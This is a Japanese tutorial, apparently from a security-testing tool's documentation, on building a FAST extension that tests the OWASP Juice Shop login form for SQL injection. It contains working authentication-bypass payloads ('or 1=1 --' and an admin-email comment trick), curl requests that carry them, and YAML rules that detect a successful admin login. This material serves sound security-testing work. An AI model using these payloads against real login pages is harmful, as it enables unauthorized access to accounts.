[link-meta-info]:           ../create-extension.md#meta-info-kaku-no-kozo
[link-send-headers]:        ../phase-send.md#host-hedda-to-no-omoshiro
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


#   変更を伴わないエクステンションの作成 

この文書で述べているエクステンションは、ペイロードを注入するための入力基本リクエストを変更しません。代わりに、2つの事前定義されたテストリクエストが、基本リクエストで指定されたホストに送信されます。これらのテストリクエストには、[「OWASPジュースショップ」][link-juice-shop]のターゲットアプリケーションのログインフォームでのSQLi脆弱性を利用する可能性のあるペイロードが含まれています.


##  準備

FASTエクステンションの作成前に、ターゲットアプリケーションの動作を[調査することが強く推奨されます][link-app-examination]。


##  エクステンションの構築 

エクステンションを記述するファイル（例えば `non-mod-extension.yaml`）を作成し、必要なセクションに情報を記入します。

1.  [**`meta-info`セクション**][link-meta-info]。

    エクステンションが検出しようとしている脆弱性の説明を準備します。

    * 脆弱性ヘッダー: `OWASP Juice Shop SQLi (non-mod extension)`
    * 脆弱性の説明: `OWASP Juice ShopでのSQLiのデモ（管理者ログイン）`
    * 脆弱性タイプ: SQLインジェクション
    * 脆弱性の脅威レベル: 高

    それに応じた`meta-info`セクションは次のようになるはずです：

    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'OWASP Juice ShopでのSQLiのデモ（管理者ログイン）'
    ```
 
2.  **`send`セクション、[送信フェーズ][doc-send-phase]**

    ターゲットアプリケーションでのSQLインジェクション脆弱性を利用するためには、以下の2つのペイロードを`email`パラメータ値として任意の`password`値と一緒に送信する必要があります：
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`

    上記の値のうち1つを`email`パラメータと、任意の値を`password`パラメータとする形で2つのテストリクエストを作成することができます。

    例の目標アプリケーション（OWASPジュースショップ）をテストするためには、これらのリクエストのうち1つを使用するだけで十分です。

    しかし、実際のアプリケーションのセキュリティテストを行う際には、いくつかの準備済みのテストリクエストを持っていると便利かもしれません：1つのリクエストがもう脆弱性を利用できなくなっても、他のテストリクエストがまだ脆弱性を利用できるかもしれません。

    先に挙げたペイロードリストの最初のペイロードを使用したリクエストは次のようなものになります：

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    2つ目のリクエストは最初のリクエストと似ています：

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    これら2つのテストリクエストの説明を含む`send`セクションを追加します：
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "`Host`ヘッダーについての注意点"
        この特定のSQLi脆弱性の利用には`Host`ヘッダーが影響を与えませんので、これらのリクエストでは`Host`ヘッダーを省略できます。FASTノードは、受信した基本リクエストから抽出した`Host`ヘッダーを自動的に追加します。
        
        送信フェーズがリクエストヘッダーをどのように扱うかについては[こちら][link-send-headers]で読むことができます。

    3.  **`detect`セクション、[検出フェーズ][doc-detect-phase]**。

    以下の条件は、管理者権限でのユーザー認証が成功したことを示します：
    
    * レスポンス本体の中に、ショッピングカート識別子パラメータの`1`の値の存在。パラメータはJSON形式で、次のようになります：

        ```
        "bid":1
        ```
    
    * レスポンス本体の中に、ユーザーメールパラメータの`admin@juice-sh.op`の値の存在。パラメータはJSON形式で、次のようになります：

        ```
         "umail":"admin@juice-sh.op"
        ```

    攻撃が成功したかどうかを、上記の条件に従って確認する`detect`セクションを追加します：
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

!!! info "特殊文字のエスケープ"
    文字列の中の特殊文字をエスケープすることを忘れないでください。

##  エクステンションファイル

`non-mod-extension.yaml`ファイルには、エクステンションが動作するために必要なセクションの全セットが含まれています。ファイルの内容は以下の通りです：

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'OWASP Juice ShopでのSQLiのデモ（管理者ログイン）'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  エクステンションの使用

作成した表現の使用方法についての詳細情報は、[この文書][link-using-extension]を参照してください。